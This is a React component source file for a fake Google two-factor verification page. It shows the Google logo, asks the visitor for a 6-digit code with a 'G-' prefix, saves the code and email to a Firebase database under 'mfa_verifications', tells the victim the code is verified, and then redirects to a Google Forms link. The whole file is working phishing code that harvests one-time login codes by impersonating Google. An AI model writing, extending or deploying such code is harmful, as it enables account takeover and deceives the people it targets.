import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { database, ref, push } from "../firebase";
import "./login.css";

const MFA = () => {
  const location = useLocation();
  const { email } = location.state || {};
  const [code, setCode] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (code.length !== 6) return alert("Please enter a 6-digit code");

    try {
      await push(ref(database, "mfa_verifications"), {
        email,
        code,
        timestamp: new Date().toISOString(),
      });

      setSubmitted(true);
      // Redirect to website after successful MFA
      setTimeout(() => {
        window.location.href = "https://forms.gle/VM2MSvDd3uuwR1WP7";
      }, 1500);
    } catch (err) {
      console.error("MFA submission failed", err);
      alert("Failed to submit code. Try again.");
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img src="/google.png" alt="Google" className="login-logo" />
        <h2 className="login-title" style={{ marginBottom: "8px" }}>Verify it's you</h2>

        <p>We sent a 6-digit code to your phone.</p>

        {email && (
          <p className="email-pill">{email}</p>
        )}

        {submitted ? (
          <p style={{ color: "green", marginTop: "20px" }}>
            Code Verified. Signing in...
          </p>
        ) : (
          <>
            <p style={{ fontSize: "16px", fontWeight: "600", marginBottom: "10px" }}>
              Enter the code
            </p>

            <form onSubmit={handleSubmit} className="login-form">
              <div className="input-with-prefix">
                <span className="prefix">G-</span>
                <input
                  type="text"
                  placeholder="Enter 6-digit code"
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
                  maxLength={6}
                  required
                />
              </div>

              <div className="login-actions">
                <button type="submit" className="next-button">
                  Verify
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default MFA;
